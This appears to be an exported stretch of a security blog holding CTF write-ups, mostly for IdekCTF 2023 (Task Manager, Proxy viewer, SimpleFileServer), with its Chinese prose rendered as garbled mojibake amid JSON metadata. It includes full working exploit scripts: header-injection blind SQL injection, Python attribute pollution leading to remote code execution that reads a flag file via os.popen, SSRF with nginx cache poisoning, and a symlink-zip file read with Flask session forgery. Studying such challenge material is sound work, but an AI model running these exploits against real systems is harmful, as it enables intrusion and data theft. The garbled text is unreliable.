é‚£ä¹ˆå¦‚æœæˆ‘ä»¬åˆ›å»ºä¸€ä¸ªåä¸ºhttp:çš„æ–‡ä»¶å¤¹ ä¹‹åè®©fileå€¼ç­‰äºhttp://xxx.xxx.xxx.txt@wafï¼Œè¿™æ ·çœ‹ä¹Ÿè®¸ä¸æ˜æ˜¾ï¼Œé‚£å¦‚æœæˆ‘ä»¬çœ‹çœ‹ç»å¯¹è·¯å¾„å‘¢ï¼Ÿ /var/www/html/uploads/sessionid/http://xxx.xxx.xxx.txt@waf æˆ‘ä»¬çŸ¥é“phpé€šå¸¸ä¼šåšè·¯å¾„æ ‡å‡†åŒ–ï¼Œ//ä¼šè¢«æ›¿æ¢æˆ/ï¼Œé‚£ä¹ˆè¿™ä¸ªè·¯å¾„ /var/www/html/uploads/sessionid/http:/xxx.xxx.xxx.txt@waf è¿™æ ·ä¹Ÿå°±èƒ½é€šè¿‡file_existså‡½æ•°äº† Expå› æ­¤æˆ‘ä»¬ç»“åˆå®Œæ•´æ”»å‡»è·¯å¾„å°†ä»¥ä¸Šæ­¥éª¤ä¸²è”èµ·æ¥å†™å‡ºexp 123456789101112131415161718192021222324252627282930313233343536import stringimport requestsimport reurl = &quot;input url&quot;i = 1flag = &#x27;&#x27;search_strs = string.printablesess = requests.session()while True: for search_str in search_strs: payload = f&quot;user=&#123;search_str&#125;&#x27;,substr((select * from flag),&#123;i&#125;,1))--&quot; username = f&quot;Hi\\r\\nX_pro-hacker: Pro-hacker\\r\\nflag: \\r\\nflag: gimme\\r\\nToken: &#123;search_str&#125;\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nHost: waf\\r\\nContent-Length: &#123;len(payload)&#125;\\r\\n\\r\\n&#123;payload&#125;&quot; sess.post(url + &quot;/login.php&quot;, data=&#123;&#x27;username&#x27;: username, &#x27;submit&#x27;: &#x27;submit&#x27;&#125;) sess.get(url + &#x27;/index.php?new=http%3A&amp;submit=Upload&#x27;) sess.post(url + &#x27;/index.php&#x27;, files=&#123; &#x27;file&#x27;: (&#x27;1.txt@waf&#x27;, &quot;&quot;.encode()), &#x27;path&#x27;: (None, &#x27;http:&#x27;), &#x27;submit&#x27;: (None, &#x27;submit&#x27;) &#125;) file_name = re.findall(&#x27;&lt;li class=&quot;list-group-item&quot;&gt;&lt;a href=\\&#x27;(.*?)\\&#x27;&gt;.*?&lt;/a&gt;&lt;/li&gt;&#x27;, sess.get(url + &quot;/view.php?fol=http:&quot;).text)[-1].replace(&quot;http:/&quot;, &quot;http://&quot;) find = sess.get(url + f&quot;&#123;file_name&#125;&amp;fol=/&quot;).text if &#x27;INDEX&#x27; not in find: flag += search_str i += 1 print(flag) break","categories":[{"name":"CTF","slug":"CTF","permalink":"https://y4tacker.github.io/categories/CTF/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://y4tacker.github.io/tags/Python/"},{"name":"PHP","slug":"PHP","permalink":"https://y4tacker.github.io/tags/PHP/"},{"name":"Go","slug":"Go","permalink":"https://y4tacker.github.io/tags/Go/"}]},{"title":"2023IdekCTFWriteup","slug":"year/2023/1/2023IdekCTFWriteup","date":"2023-01-16T07:37:01.000Z","updated":"2024-08-04T09:01:49.694Z","comments":true,"path":"2023/01/16/year/2023/1/2023IdekCTFWriteup/","link":"","permalink":"https://y4tacker.github.io/2023/01/16/year/2023/1/2023IdekCTFWriteup/","excerpt":"","text":"2023 IdekCTF Writeupç”±äºå¯¹xssä¸æ˜¯å¾ˆæ‡‚æ‰€ä»¥ä¸€èˆ¬éƒ½æ˜¯åšçš„éxsséƒ¨åˆ†ï¼Œå¾ˆé«˜å…´æœ€ç»ˆè¢«å¼ºå¤§çš„é˜Ÿå‹å¸¦é£ä¸‹æ‹¿åˆ°ç¬¬äºŒå ç¯å¢ƒç¯å¢ƒå¯ä»¥åœ¨æˆ‘çš„ä»“åº“ä¸‹ï¼Œå¤‡ä»½äº†Dockerfileï¼Œå¯ä»¥æœ¬åœ°æ­å»ºè‡ªå·±å­¦ä¹  https://github.com/Y4tacker/CTFBackup/tree/main/2023/IdekCTF Task Managerä¸€ä¸ªpythonå†™çš„å¥½çœ‹çš„TODO LIST é‚£ä¹ˆæˆ‘ä»¬å…·ä½“æ¥çœ‹çœ‹å¦‚ä½•å®ç°ï¼Œè¿™é‡Œé‡ç‚¹çœ‹ï¼Œé€šè¿‡jsonä¼ å…¥taskä¸statusä¸¤ä¸ªå‚æ•°ï¼Œä¸åŒå‚æ•°æ¡ä»¶è¿›å…¥ä¸åŒåˆ†æ”¯ï¼Œé€šè¿‡taskså¯¹è±¡å®ç°äº†åŸºæœ¬çš„åŠŸèƒ½ 12345678910111213141516171819202122@app.route(&quot;/api/manage_tasks&quot;, methods=[&quot;POST&quot;])def manage_tasks(): task, status = request.json.get(&#x27;task&#x27;), request.json.get(&#x27;status&#x27;) try: if not task or type(task) != str: return &#123;&quot;message&quot;: &quot;You must provide a task name as a string!&quot;&#125;, 400 if len(task) &gt; 150: return &#123;&quot;message&quot;: &quot;Tasks may not be over 150 characters long!&quot;&#125;, 400 if status and len(status) &gt; 50: return &#123;&quot;message&quot;: &quot;Statuses may not be over 50 characters long!&quot;&#125;, 400 if not status: tasks.complete(task) return &#123;&quot;message&quot;: &quot;Task marked complete!&quot;&#125;, 200 if type(status) != str: return &#123;&quot;message&quot;: &quot;Your status must be a string!&quot;&#125;, 400 if tasks.set(task, status): return &#123;&quot;message&quot;: &quot;Task updated!&quot;&#125;, 200 return &#123;&quot;message&quot;: &quot;Invalid task name!&quot;&#125;, 400 except Exception as e: # e. print(e) return &#123;&quot;message&quot;: str(e)&#125;, 200 é‚£è¿™ä¸ªtaskså¯¹è±¡åˆæ˜¯ä¸ªå•¥å‘¢ï¼Ÿå¦‚ä¸‹2333ï¼Œå¾ˆæ˜æ˜¾ç»™ä½ æç¤ºäº†protectedé‡Œé¢å­˜åœ¨ä¸€äº›éªšä¸œè¥¿ï¼Œçœ‹ç€æ˜¯å¾ˆåƒSSTI 123456789101112131415161718192021222324252627import pydashclass TaskManager: protected = [&quot;set&quot;, &quot;get&quot;, &quot;get_all&quot;, &quot;__init__&quot;, &quot;complete&quot;] def __init__(self): self.set(&quot;capture the flag&quot;, &quot;incomplete&quot;) def set(self, task, status): if task in self.protected: return pydash.set_(self, task, status) return True def complete(self, task): if task in self.protected: return pydash.set_(self, task, False) return True def get(self, task): if hasattr(self, task): return &#123;task: getattr(self, task)&#125; return &#123;&#125; def get_all(self): return self.__dict__ åŒæ—¶æˆ‘ä»¬å†çœ‹çœ‹è¿™ä¸ªset_æ–¹æ³•ï¼Œçœ‹docå®ƒæ”¯æŒä¸€äº›é“¾å¼è°ƒç”¨ ä½†æ˜¯ä¹Ÿä¸æ˜¯æ— æ•Œçš„ä¸åƒæˆ‘ä»¬ä¼ ç»ŸSSTIé‚£æ ·ï¼Œå®ƒåªèƒ½æ“ä½œä¸€äº›å±æ€§ï¼Œè€Œä¸èƒ½è°ƒç”¨æ–¹æ³•ï¼ŒåŒæ—¶ä»–çš„æ“ä½œå¯¹è±¡æ˜¯è¿™ä¸ªTaskManagerç±»ï¼ŒåŒæ—¶ç”±äºä»£ç é™åˆ¶æˆ‘ä»¬åªèƒ½ä¸ºå…¶èµ‹å€¼ä¸ºstringç±»å‹ï¼Œè¿™ç§æ€æƒ³å°±æœ‰ç‚¹ç±»ä¼¼jså½“ä¸­åŸå‹é“¾æ±¡æŸ“çš„æ„Ÿè§‰äº† åŒæ—¶æˆ‘ä»¬å†å›åˆ°app.pyï¼Œå¦‚æœapp.envå€¼æ˜¯yojoï¼Œåˆ™ä¼šå‘å…¨å±€æ¨¡æ¿å‡½æ•°ä¸­å¢åŠ ä¸€ä¸ªevalï¼Œé€šè¿‡add_template_globalä»¥åæˆ‘ä»¬å°±èƒ½åœ¨æ¨¡æ¿é‡Œä½¿ç”¨&#123;&#123;eval(payload)&#125;&#125;å‡½æ•°è§¦å‘ 1234@app.before_first_requestdef init(): if app.env == &quot;yojo&quot;: app.add_template_global(eval) é‚£ä¹ˆç°åœ¨é‡ç‚¹å°±æ˜¯å¦‚ä½•é€šè¿‡TaskManagerçš„å®ä¾‹å¯¹è±¡è·å–åˆ°æˆ‘ä»¬flaskçš„appå¯¹è±¡ æœ‰äº†è¿™ä¸ªä¸€æ–¹é¢æˆ‘ä»¬å¯ä»¥è®¾ç½®envï¼Œå¦ä¸€æ–¹é¢æˆ‘ä»¬è¿˜å¯ä»¥æ§åˆ¶before_first_request(æ¯•ç«Ÿè¿™ä¸ªåªä¼šåœ¨ç¬¬ä¸€æ¬¡åŠ è½½æ—¶è¿è¡Œ) æœ€ç»ˆåœ¨pythonçš„debuggerä¸‹é€šè¿‡ç‚¹ç‚¹ç‚¹æœ€ç»ˆæ‰¾åˆ°äº†è¿™ä¸ªappå¯¹è±¡ å…¶ä¸­_got_first_requestå¯ä»¥æ§åˆ¶@app.before_first_requestçš„è¿è¡Œ éé¢„æœŸè¯»æ–‡ä»¶çœ‹çœ‹Dockerfileé‡Œé¢ 1234567891011121314151617FROM python:3.8.16-slim-bullseyeRUN apt update &amp;&amp; apt install -y xxdRUN python3 -m pip install flask pydashRUN echo &quot;idek&#123;[REDACTED]&#125;&quot; &gt; /flag-$(head -c 16 /dev/urandom | xxd -p).txtRUN useradd ctfUSER ctfWORKDIR /appCOPY . .ENTRYPOINT [&quot;python3&quot;, &quot;app.py&quot;] æœ€åè°ƒç”¨COPY . .å¤åˆ¶äº†æ‰€æœ‰çš„æ–‡ä»¶ï¼Œçœ‹çœ‹æ–‡ä»¶ç»“æ„è¿™ä¹Ÿå°±ä»¥ä¸ºç€æŠŠDockerfileè‡ªèº«ä¹Ÿå¤åˆ¶è¿›å»äº†2333 å§¿åŠ¿1å¯ä»¥çœ‹åˆ°è¿™é‡Œæœ‰ä¸ª_static_url_pathå±æ€§ï¼Œè¿™æ˜¯å•¥ç›®å½•å¤§å®¶éƒ½çŸ¥é“ä¸€äº›é™æ€èµ„æºæ–‡ä»¶éƒ½æ”¾ä¸‹é¢ é‚£ä¹ˆå¦‚æœæˆ‘ä»¬è®¾ç½®app._static_folder ä¸º / æ¥ç€è®¿é—® /static/etc/passwd 1&#123;&quot;task&quot;:&quot;__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app._static_folder&quot;,&quot;status&quot;:&quot;/&quot;&#125; ä»»æ„æ–‡ä»¶è¯» å§¿åŠ¿2ä»app.pyå½“ä¸­çœ‹ 123456@app.route(&quot;/&lt;path:path&gt;&quot;)def render_page(path): app._got_first_request = False if not os.path.exists(&quot;templates/&quot; + path): return &quot;not found&quot;, 404 return render_template(path) å¦‚æœæˆ‘ä»¬è®¿é—®/../app.pyä¼šæ€ä¹ˆæ ·å‘¢ï¼Œå¾ˆæ˜¾ç„¶æŠ¥é”™äº† æˆ‘ä»¬å¯ä»¥çœ‹çœ‹flaskçš„å®ç°ä»£ç ï¼Œåœ¨jinja2.loaders.FileSystemLoader.get_source åœ¨è¿™é‡Œé¦–å…ˆé€šè¿‡split_template_pathå¤„ç†è·¯å¾„ å¦‚æœæˆ‘ä»¬è·¯å¾„å½“ä¸­å¸¦æœ‰..å¯ä»¥çœ‹åˆ°ç”±äºå’Œos.path.pardirç›¸ç­‰ï¼Œå¯¼è‡´æŠ›å‡ºTemplateNotFoundå¼‚å¸¸ï¼Œä¹Ÿå°±æ˜¯ä¸å…è®¸è·¨ç›®å½• é‚£å¦‚æœæˆ‘ä»¬æ±¡æŸ“äº†os.path.pardiré‚£ä¹ˆè¿™é‡Œå°±é€šè¿‡äº†æ¡ä»¶ï¼Œä¸ä¼šæ‹¦æˆª æˆåŠŸå®ç°äº†è·¨ç›®å½•è¯» é¢„æœŸRCEåŒæ—¶è¿™é‡Œè¿˜æœ‰ä¸€ä¸ªjinja_envå±æ€§æˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¾ˆå¤šæœ‰è¶£çš„å±æ€§æ¯”å¦‚auto_reloadï¼Œè¿™é‡Œè¿˜æœ‰è¯†åˆ«æ¨¡æ¿çš„&#123;%%&#125;ä»¥åŠ&#123;&#123;&#125;&#125; å§¿åŠ¿1é‚£ä¹ˆåˆ°äº†è¿™é‡Œå¦‚æœæˆ‘ä»¬èƒ½æ‰¾åˆ°ä¸€ä¸ªpyæ–‡ä»¶ï¼Œè¿™ä¸ªpyæ–‡ä»¶é‡Œé¢æœ‰evalå‡½æ•°ï¼Œé‚£æ˜¯ä¸æ˜¯æˆ‘ä»¬å°±èƒ½æˆåŠŸrceäº†å‘¢ï¼Ÿè¿™éƒ¨åˆ†æˆ‘å’Œé˜Ÿå‹ä¸€ç›´æ²¡æ‰¾åˆ°ï¼Œæœ€åå‡ºé¢˜äººæä¾›äº†ç­”æ¡ˆï¼Œåœ¨/usr/local/lib/python3.8/turtle.py é‚£ä¹ˆå¦‚æœæˆ‘ä»¬æ§åˆ¶ä¿®æ”¹è¿™ä¸ªæ¨¡æ¿çš„æ ‡ç­¾ï¼Œå†é…åˆæ±¡æŸ“os.path.pardir,é‚£ä¹ˆæ˜¯ä¸æ˜¯å°±èƒ½æ¸²æŸ“ä»»æ„æ–‡ä»¶é¡ºåˆ©RCEäº†å‘¢ æä¾›ä¸€ä¸ªå‡ºé¢˜äººçš„exp 1234567891011121314151617181920212223242526272829303132333435363738import requestsimport rebase_url = &quot;http://localhost:1337&quot;#base_url = &quot;https://task-manager-dc512c530573c0b4.instancer.idek.team&quot;hijack_start = &quot;&quot;&quot;&#x27;&quot;&quot;&#x27;]:\\n value = &quot;&quot;&quot;hijack_end = &quot;\\n&quot;payloads = &#123; &quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.env&quot;: &quot;yolo&quot;, &quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.jinja_env.globals.value&quot;: &quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag-*.txt&#x27;).read()&quot;, &quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_start_string&quot;: hijack_start, &quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_end_string&quot;: hijack_end, &quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir&quot;: &quot;ZZZ&quot;, &quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app._got_first_request&quot;: None, &#125;def overwrite(attr, value): data = &#123;&quot;task&quot;: attr, &quot;status&quot;: value&#125; requests.post(base_url + &quot;/api/manage_tasks&quot;, json=data)def get_flag(): url = base_url + &quot;/../../usr/local/lib/python3.8/turtle.py&quot; s = requests.Session() r = requests.Request(method=&#x27;GET&#x27;, url=url) prep = r.prepare() prep.url = url r = s.send(prep) flag = re.findall(&#x27;idek&#123;.*&#125;&#x27;, r.text)[0] print(flag)for k, v in payloads.items(): overwrite(k, v)get_flag() å§¿åŠ¿2å­¦ä¹ è‡ªå›½å¤–å‹äººhttps://github.com/Myldero/ctf-writeups/tree/master/idekCTF%202022/task%20manager ä»ç¼–è¯‘å…¥æ‰‹å¾ˆç§€,åœ¨ç”Ÿæˆæ¨¡æ¿çš„è¿‡ç¨‹ä¸­jinja2.compiler.CodeGenerator.visit_Template å¦‚æœæˆ‘ä»¬æ±¡æŸ“äº†exportedå˜é‡é‚£ä¹ˆå°±å¯ä»¥æ§åˆ¶æ¨¡æ¿çš„ç”Ÿæˆ æ­£å¥½æ˜¯å¯ä»¥çš„ ä¹‹åè®¿é—®æ¸²æŸ“ä»»æ„æ¨¡æ¿çš„æ—¶å€™å°±èƒ½è§¦å‘RCEï¼Œå¾ˆå‰å®³ï¼ Proxy vieweræ¯”è¾ƒæœ‰æ„æ€çš„é¢˜ç›®ï¼Œé¦–å…ˆçœ‹çœ‹app.pyä¸­å…³é”®è·¯ç”±éƒ¨åˆ† 123456789101112131415161718192021222324252627282930313233app = Flask( __name__, static_url_path=&#x27;/static&#x27;, static_folder=&#x27;./static&#x27;, )PREMIUM_TOKEN = os.urandom(32).hex()limiter = Limiter(app, key_func=get_remote_address)@app.after_requestdef add_headers(response): response.cache_control.max_age = 120 return response@app.route(&#x27;/&#x27;)def index(): return render_template(&#x27;index.html&#x27;)@app.route(&#x27;/proxy/&lt;path:path&gt;&#x27;)@limiter.limit(&quot;10/minute&quot;)def proxy(path): remote_addr = request.headers.get(&#x27;X-Forwarded-For&#x27;) or request.remote_addr is_authorized = request.headers.get(&#x27;X-Premium-Token&#x27;) == PREMIUM_TOKEN or remote_addr == &quot;127.0.0.1&quot; try: page = urlopen(path, timeout=.5) except: return render_template(&#x27;proxy.html&#x27;, auth=is_authorized) if is_authorized: output = page.read().decode(&#x27;latin-1&#x27;) else: output = f&quot;&lt;pre&gt;&#123;page.headers.as_string()&#125;&lt;/pre&gt;&quot; return render_template(&#x27;proxy.html&#x27;, auth=is_authorized, content=output) å…¶ä¸­æ¯”è¾ƒå…³é”®çš„æ˜¯è¿™ä¸ª/proxyè·¯ç”±ï¼Œå­˜åœ¨ä¸€ä¸ªssrfæ¼æ´ï¼Œä½†æ˜¯å¿…é¡»is_authorizedä¸ºtrueæ‰ä¼šè¿”å›å…¨éƒ¨ç»“æœï¼Œå¦åˆ™åªè¿”å›å“åº”å¤´ å¦ä¸€ä¸ªå…³é”®çš„åœ°æ–¹å°±æ˜¯nginxçš„é…ç½®ï¼Œå¯ä»¥çœ‹è§å¦‚æœä»¥/static/å¼€å¤´é‚£ä¹ˆå°±ä¼šç¼“å­˜å¯¹åº”é¡µé¢å†…å®¹ åŒæ—¶å¯ä»¥çœ‹åˆ°å¯¹/å¼€å¤´çš„æ‰€æœ‰è¯·æ±‚éƒ½ä¼šå¢åŠ ä¸€ä¸ªXFFå¤´ï¼Œå› æ­¤å¯¹äºä¸Šé¢çš„remote_addræˆ‘ä»¬æ— æ³•è¿›è¡Œä¼ªé€ ï¼Œå› ä¸ºnginxå¯¹æ­¤å¤„ç†æ˜¯è¿½åŠ ipï¼Œæ¯”å¦‚(XFF:127.0.0.1,readlip) 12345678910111213141516171819202122232425262728events &#123; worker_connections 1024;&#125;http &#123; include mime.types; proxy_cache_path /tmp/nginx keys_zone=my_zone:10m inactive=60m use_temp_path=off; server &#123; listen 1337; client_max_body_size 64M; location / &#123; proxy_set_header Host $http_host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_pass http://localhost:3000; &#125; location ^~ /static/ &#123; proxy_pass http://localhost:3000; proxy_set_header Host $http_host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_cache my_zone; add_header X-Proxy-Cache $upstream_cache_status; &#125; &#125;&#125; è¿™é‡Œè¿˜è¦ç”¨åˆ°ä¸€ä¸ªtrickå°±æ˜¯ï¼Œurlopenå†…éƒ¨å¤„ç†æ—¶ä¼šåœ¨urllib.request.Request.full_urlä¸­å»é™¤#åé¢éƒ¨åˆ† 12345678910111213@full_url.setterdef full_url(self, url): # unwrap(&#x27;&lt;URL:type://host/path&gt;&#x27;) --&gt; &#x27;type://host/path&#x27; self._full_url = unwrap(url) self._full_url, self.fragment = _splittag(self._full_url) self._parse() def _splittag(url): &quot;&quot;&quot;splittag(&#x27;/path#tag&#x27;) --&gt; &#x27;/path&#x27;, &#x27;tag&#x27;.&quot;&quot;&quot; path, delim, tag = url.rpartition(&#x27;#&#x27;) if delim: return path, tag return url, None å› æ­¤é…åˆè¿™ä¸ªtrickï¼Œæˆ‘ä»¬å…ˆè®¿é—® 1http://127.0.0.1:1337/proxy/http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/a æ­¤æ—¶flaskä¼šæŠŠfile%3a///flag.txt%2523/../../../static/aæ•´ä½“å½“ä½œ è€Œnginxåˆ™ä¼šå¯¹urlåšnormalizeå¤„ç†ï¼Œæœ€ç»ˆå¯¼è‡´nginxè¯†åˆ«è¯·æ±‚ä¸ºhttp://127.0.0.1:1337/static/a å†è®¿é—®å³å¯è§¦å‘ç¼“å­˜ 1http://127.0.0.1:1337/proxy/http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/a SimpleFileServerä¹Ÿæ˜¯pythonçš„flaskçš„é¢˜ç›® å¯ä»¥çœ‹åˆ°è·å¾—flagçš„æ¡ä»¶ï¼Œé‚£å°±æ˜¯æˆä¸ºadminï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“çŒœæµ‹åˆ°è€ƒç‚¹æ˜¯sessionä¼ªé€ ï¼Œè€Œflaské‡Œé¢è¿™ä¸ªsessionçš„ç”Ÿæˆé€šå¸¸å’Œå˜é‡app.config[&quot;SECRET_KEY&quot;]æ¯æ¯ç›¸å…³ 12345@app.route(&quot;/flag&quot;)def flag(): if not session.get(&quot;admin&quot;): return &quot;Unauthorized!&quot; return subprocess.run(&quot;./flag&quot;, shell=True, stdout=subprocess.PIPE).stdout.decode(&quot;utf-8&quot;) å› æ­¤ä¸€åˆ‡çš„å‰ææ˜¯æˆ‘ä»¬èƒ½è·å¾—è¿™ä¸ªSECRET_KEY 1app.config[&quot;SECRET_KEY&quot;] = os.environ[&quot;SECRET_KEY&quot;] è€Œè¿™éƒ¨åˆ†ç”Ÿæˆåœ¨config.pyå½“ä¸­ 123SECRET_OFFSET = 0 # REDACTEDrandom.seed(round((time.time() + SECRET_OFFSET) * 1000))os.environ[&quot;SECRET_KEY&quot;] = &quot;&quot;.join([hex(random.randint(0, 15)) for x in range(32)]).replace(&quot;0x&quot;, &quot;&quot;) è¦çˆ†ç ´è¿™éƒ¨åˆ†å¾ˆæ˜æ˜¾ä¸€æ˜¯æˆ‘ä»¬éœ€è¦çŸ¥é“è¿™ä¸ªtime.time()çš„å€¼ï¼Œå¦ä¸€ä¸ªè¿˜éœ€è¦çŸ¥é“SECRET_OFFSETçš„åç§» é™¤å¼€æ³¨å†Œä¸ç™»å½•è·¯ç”±ï¼Œupoadæ”¯æŒä¸Šä¼ ä¸€ä¸ªzipæ–‡ä»¶å¹¶è§£å‹åˆ°æŒ‡å®šç›®å½• 12345678910111213141516171819@app.route(&quot;/upload&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])def upload(): if not session.get(&quot;uid&quot;): return redirect(&quot;/login&quot;) if request.method == &quot;GET&quot;: return render_template(&quot;upload.html&quot;) if &quot;file&quot; not in request.files: flash(&quot;You didn&#x27;t upload a file!&quot;, &quot;danger&quot;) return render_template(&quot;upload.html&quot;) file = request.files[&quot;file&quot;] uuidpath = str(uuid.uuid4()) filename = f&quot;&#123;DATA_DIR&#125;uploadraw/&#123;uuidpath&#125;.zip&quot; file.save(filename) subprocess.call([&quot;unzip&quot;, filename, &quot;-d&quot;, f&quot;&#123;DATA_DIR&#125;uploads/&#123;uuidpath&#125;&quot;]) flash(f&#x27;Your unique ID is &lt;a href=&quot;/uploads/&#123;uuidpath&#125;&quot;&gt;&#123;uuidpath&#125;&lt;/a&gt;!&#x27;, &quot;success&quot;) logger.info(f&quot;User &#123;session.get(&#x27;uid&#x27;)&#125; uploaded file &#123;uuidpath&#125;&quot;) return redirect(&quot;/upload&quot;) uploads/xxxè·¯ç”±æ”¯æŒæˆ‘ä»¬ä¹‹é—´è¯»å–ä¸Šä¼ è§£å‹åçš„æ–‡ä»¶å†…å®¹ 123456@app.route(&quot;/uploads/&lt;path:path&gt;&quot;)def uploads(path): try: return send_from_directory(DATA_DIR + &quot;uploads&quot;, path) except PermissionError: abort(404) è¿™ä¸ªè¯»æ–‡ä»¶éƒ¨åˆ†æŒ‰ç†è¯´åªèƒ½è¯»å–uploadsä¸‹çš„æ–‡ä»¶ï¼Œçœ‹çœ‹åº•å±‚å®ç°ç”¨çš„æ˜¯safe_joinä¸æ”¯æŒè·¨ç›®å½•è¯»å– å¯ä»¥çœ‹åˆ°åœ¨è¿™é‡Œè·å–è·¯å¾„pathåï¼Œæœ€ç»ˆè°ƒç”¨openæ‰“å¼€æ–‡ä»¶å¹¶è¿”å›å†…å®¹ è§£å†³æ–¹æ³•æ˜¯å¯ä»¥é…åˆsymlinkè½¯è¿æ¥å®ç°ä»»æ„æ–‡ä»¶è¯»ï¼Œè¿™æ ·æˆ‘ä»¬ä¸€æ–¹é¢å¯ä»¥è¯»config.pyè·å–SECRET_OFFSET å¦ä¸€æ–¹é¢ä¸ºäº†å¾—åˆ°æ—¶é—´ å¯ä»¥çœ‹åˆ°é¢˜ç›®å¾ˆè‰¯å¿ƒçš„åœ¨server.logå½“ä¸­è¾“å‡ºäº†time 12345678910# Configure loggingLOG_HANDLER = logging.FileHandler(DATA_DIR + &#x27;server.log&#x27;)LOG_HANDLER.setFormatter(logging.Formatter(fmt=&quot;[&#123;levelname&#125;] [&#123;asctime&#125;] &#123;message&#125;&quot;, style=&#x27;&#123;&#x27;))logger = logging.getLogger(&quot;application&quot;)logger.addHandler(LOG_HANDLER)logger.propagate = Falsefor handler in logging.root.handlers[:]: logging.root.removeHandler(handler)logging.basicConfig(level=logging.WARNING, format=&#x27;%(asctime)s %(levelname)s %(name)s %(threadName)s : %(message)s&#x27;)logging.getLogger().addHandler(logging.StreamHandler()) ä¸è¿‡è¿™ä¸ªæ—¶é—´ä¸æ˜¯ç²¾ç¡®çš„ï¼Œé€šè¿‡è½¬æ¢ä¸ºæ—¶é—´æˆ³æˆ‘ä»¬åªèƒ½ç²¾ç¡®åˆ°æ•´æ•°éƒ¨åˆ†ï¼Œä¸è¿‡å¥½åœ¨è¿™é‡Œéšæœºæ•°çš„seedæ˜¯é…åˆroundåšäº†å–æ•´å› æ­¤æˆ‘ä»¬å°±èƒ½å¾ˆå®¹æ˜“å®ç°çˆ†ç ´äº† æˆ‘ä»¬å¯ä»¥å¾ˆæ–¹ä¾¿é…åˆè¿™ä¸ªä¿¡æ¯å¾—åˆ°time.time()çš„å€¼ æœ¬åœ°lnåšä¸€ä¸ªsymlinkçš„æ–‡ä»¶ ä¹‹åçˆ†ç ´åˆ°SECRET_KEYåï¼Œä¿®æ”¹adminä¸ºtrueå†ç”Ÿæˆsessionå³å¯ 1decoded = &#123;&#x27;admin&#x27;: True, &#x27;uid&#x27;: userinfo[&#x27;username&#x27;]&#125; æœ€ç»ˆexpï¼Œé…åˆflask_unsign 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import base64import requests, re, time, datetime, randomimport flask_unsignsess = requests.session()SECRET_OFFSET = -67198624 * 1000userinfo = &#123;&quot;username&quot;: &quot;yyds&quot;, &quot;password&quot;: &quot;yyds&quot;&#125;baseurl = &quot;http://127.0.0.1:1337/&quot;pocZip = &quot;UEsDBAoAAAAAACJsMVZvT1MBDwAAAA8AAAAKABwAc2VydmVyLmxvZ1VUCQADDzPGYw8zxmN1eAsAAQT1AQAABBQAAAAvdG1wL3NlcnZlci5sb2dQSwMECgAAAAAAG2wxVuPo95IOAAAADgAAAAkAHABjb25maWcucHlVVAkAAwUzxmMFM8ZjdXgLAAEE9QEAAAQUAAAAL2FwcC9jb25maWcucHlQSwECHgMKAAAAAAAibDFWb09TAQ8AAAAPAAAACgAYAAAAAAAAAAAA7aEAAAAAc2VydmVyLmxvZ1VUBQADDzPGY3V4CwABBPUBAAAEFAAAAFBLAQIeAwoAAAAAABtsMVbj6PeSDgAAAA4AAAAJABgAAAAAAAAAAADtoVMAAABjb25maWcucHlVVAUAAwUzxmN1eAsAAQT1AQAABBQAAABQSwUGAAAAAAIAAgCfAAAApAAAAAAA&quot;cookie = &quot;&quot;log_url = &quot;&quot;def register(): reg_url = baseurl + &quot;register&quot; sess.post(reg_url, userinfo)def login(): global cookie set_cookie = sess.post(baseurl + &quot;login&quot;, data=userinfo, allow_redirects=False).headers[&#x27;Set-Cookie&#x27;] cookie = set_cookie[8:82]def upload(): global log_url log_url = re.search(&#x27;&lt;a href=&quot;/uploads/.*&quot;&gt;&#x27;, sess.post( baseurl + &quot;upload&quot;, headers=&#123;&#x27;Cookie&#x27;: f&#x27;session=&#123;cookie&#125;&#x27;&#125;, files=&#123;&#x27;file&#x27;: base64.b64decode(pocZip)&#125;).text).group()[9:-2]def read(): server_log = baseurl + log_url + &quot;/server.log&quot; config = baseurl + log_url + &quot;/config.py&quot; SECRET_OFFSET = int(re.findall(&quot;SECRET_OFFSET = (.*?) # REDACTED&quot;, sess.get(config).text)[0]) * 1000 log = sess.get(server_log).text now = (time.mktime(datetime.datetime.strptime(log.split(&#x27;\\n&#x27;)[0][1:20], &quot;%Y-%m-%d %H:%M:%S&quot;).timetuple())) * 1000 return SECRET_OFFSET,nowif __name__ == &#x27;__main__&#x27;: register() login() upload() SECRET_OFFSET, now = read() while 1: decoded = &#123;&#x27;admin&#x27;: True, &#x27;uid&#x27;: userinfo[&#x27;username&#x27;]&#125; random.seed(round(now + int(SECRET_OFFSET))) SECRET_KEY = &quot;&quot;.join([hex(random.randint(0, 15)) for x in range(32)]).replace(&quot;0x&quot;, &quot;&quot;) flag_url = baseurl + &quot;flag&quot; res = sess.get(flag_url, headers=&#123;&#x27;Cookie&#x27;: f&#x27;session=&#123;flask_unsign.sign(decoded, SECRET_KEY)&#125;&#x27;&#125;).text if &quot;idek&quot; not in res: now += 1 print(now) continue print(res) break ReadMeå¾ˆç®€å•ç­¾åˆ°é¢˜ï¼Œç®—æ˜¯ä¸ªé€»è¾‘æ¼æ´é—®é¢˜ è¿™ä¸ªç¨‹åºä¸­åªæœ‰ä¸€ä¸ªè·¯ç”± 1http.HandleFunc(&quot;/just-read-it&quot;, justReadIt) 